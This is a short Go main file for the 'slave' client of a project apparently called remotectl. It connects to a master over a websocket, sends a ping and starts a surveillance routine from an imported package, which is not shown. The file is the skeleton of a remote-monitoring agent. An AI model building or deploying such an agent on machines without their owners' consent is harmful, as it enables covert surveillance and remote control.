package main

import (
	"fmt"

	"github.com/gardc/remotectl/comms"
	"github.com/gardc/remotectl/surveillance"
	"github.com/gorilla/websocket"
)

func main() {
	fmt.Println("Hello, World! I'm the slave!")

	conn, err := comms.ConnectToMaster()
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	go comms.ManageConnection(conn)

	pingMsg, err := comms.CreateMessage(comms.PingMessage, nil)
	if err != nil {
		panic(err)
	}
	err = conn.WriteMessage(websocket.TextMessage, pingMsg)
	if err != nil {
		panic(err)
	}

	// wait until pong received

	surveillance.Start(conn)

	select {} // Block indefinitely to keep the program running
}
